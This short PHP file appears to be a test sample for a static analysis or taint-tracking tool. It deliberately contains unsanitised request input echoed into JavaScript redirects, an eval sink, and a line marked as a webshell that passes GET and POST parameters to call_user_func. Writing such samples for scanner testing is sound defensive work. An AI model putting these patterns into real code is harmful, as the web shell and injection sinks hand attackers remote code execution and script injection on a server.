<?php

$a = $_GET['1'];
echo ($param == 1? 90: $a);

if($a = 1){
    $b = 'test';
}elseif($c = 1){
    $b = 'dddd';
}else{
    $cc = "1";
    $b = $_GET['b'];
}

function c($c){
    echo $c;
    echo 'location.replace("'.$c.'");';
}

for($i=0; $i<=2; $i++){
    $d = $_GET['c'].$i;
}

c("test".$b."ccc");
c($d);


# 解析递归导致的死循环

function e($a){
    if(1>0){
        eval($a);
    }else{
        e($a);
    }
}

# webshell
call_user_func($_GET['hs'],$_POST[evil]);


# 多语句导致的死循环？

function header($d){
    header($d);
}
